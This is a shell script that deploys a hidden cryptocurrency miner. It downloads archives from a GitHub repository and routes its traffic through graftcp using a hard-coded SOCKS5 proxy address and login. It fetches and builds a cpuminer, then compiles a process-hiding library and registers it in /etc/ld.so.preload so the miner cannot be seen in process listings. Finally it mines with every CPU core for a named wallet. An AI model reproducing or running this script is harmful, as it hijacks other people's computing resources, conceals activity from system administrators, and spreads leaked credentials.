#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 18.118.170.100:1080
socks5_username = sempakcok
socks5_password = gunturmanis
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

./graftcp/graftcp wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz
tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz

./graftcp/graftcp wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/kontol.zip
unzip kontol.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./cpuminer -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u RSXFTyohSPGC63BXBQZ5F9jeQcqxvgS1Dx.Worker -p c=RVN -t $(nproc --all)
